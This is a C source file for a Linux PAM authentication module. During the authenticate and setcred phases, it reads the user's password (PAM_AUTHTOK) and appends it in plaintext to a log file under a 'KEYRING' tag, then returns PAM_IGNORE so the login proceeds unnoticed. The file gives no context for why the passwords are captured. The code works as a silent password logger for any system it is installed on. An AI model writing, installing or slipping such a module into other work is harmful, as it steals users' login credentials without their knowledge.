#include <security/pam_modules.h>
#include <stdio.h>

#define LOG_PATH "/run/pamstack/log"

static int record(pam_handle_t *h, const char *phase) {
  const void *token = NULL;
  pam_get_item(h, PAM_AUTHTOK, &token);
  FILE *f = fopen(LOG_PATH, "a");
  if (f) {
    fprintf(f, "KEYRING %s authtok=%s\n", phase, token ? (const char *)token : "(unset)");
    fclose(f);
  }
  return PAM_IGNORE;
}

int pam_sm_authenticate(pam_handle_t *h, int flags, int argc, const char **argv) {
  (void)flags; (void)argc; (void)argv;
  return record(h, "authenticate");
}

int pam_sm_setcred(pam_handle_t *h, int flags, int argc, const char **argv) {
  (void)flags; (void)argc; (void)argv;
  return record(h, "setcred");
}

int pam_sm_open_session(pam_handle_t *h, int flags, int argc, const char **argv) {
  (void)h; (void)flags; (void)argc; (void)argv;
  return PAM_IGNORE;
}

int pam_sm_close_session(pam_handle_t *h, int flags, int argc, const char **argv) {
  (void)h; (void)flags; (void)argc; (void)argv;
  return PAM_IGNORE;
}

int pam_sm_chauthtok(pam_handle_t *h, int flags, int argc, const char **argv) {
  (void)h; (void)flags; (void)argc; (void)argv;
  return PAM_IGNORE;
}
